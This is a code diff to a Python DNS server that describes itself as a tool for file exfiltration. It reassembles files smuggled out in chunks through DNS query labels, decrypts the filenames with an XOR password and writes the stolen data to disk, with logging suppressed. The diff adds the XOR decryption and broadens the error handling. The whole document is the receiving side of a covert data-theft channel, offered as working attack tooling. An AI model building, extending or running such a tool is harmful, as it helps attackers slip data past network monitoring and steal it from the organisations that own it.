@@ -63,11 +63,12 @@ class DataResolver(BaseResolver):
         reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
 
         # Extract metadata and filename from the second last label
-        metadata = labels[5]
         try:
+            metadata = labels[5]
             filename_hex, timestamp, number_of_chunks = metadata.split('|')
-            filename = bytearray.fromhex(filename_hex).decode()
-        except (binascii.Error, ValueError):
+            filename_enc = bytearray.fromhex(filename_hex)
+            filename = self.xor_decrypt(filename_enc, self.password).decode()
+        except:
             return reply
 
         # Prepare the file key
@@ -75,7 +76,7 @@ class DataResolver(BaseResolver):
 
         if file_key not in self.data_store:
             self.data_store[file_key] = [None] * int(number_of_chunks)  # Pre-allocate list for all chunks
-            print(color(f"¨\n[*] Reception of new file {file_key} initiated!"))
+            print(color(f"\n[*] Reception of new file {file_key} has started!"))
 
         # Extract chunk ID and hex-encoded chunks
         chunk_id = int(labels[0])
@@ -105,8 +106,8 @@ class DataResolver(BaseResolver):
                             f.write(decompressed_data)
                         print(color(f"\n[+] Data written to {file_key}"))
 
-                except (binascii.Error, ValueError):
-                    print(color(f"\n[!] Failed to decode data for {file_key}"))
+                except:
+                    print(color(f"\n[!] Failed to decode or write data of {file_key}"))
 
         return reply
 
@@ -120,13 +121,13 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="DNS server for file exfiltration.")
     parser.add_argument("dns_server_ip", help="IP address of the DNS server")
     parser.add_argument("password", help="Password for XOR encryption/decryption")
-    parser.add_argument("--use_tcp", action="store_true", help="Use TCP instead of UDP")
+    parser.add_argument("--usetcp", action="store_true", help="Use TCP instead of UDP")
     
     args = parser.parse_args()
     
     dns_server_ip = args.dns_server_ip
     password = args.password
-    use_tcp = args.use_tcp
+    use_tcp = args.usetcp
 
     logger = NoOpLogger()  # Use the no-op logger to suppress output
     resolver = DataResolver(password)
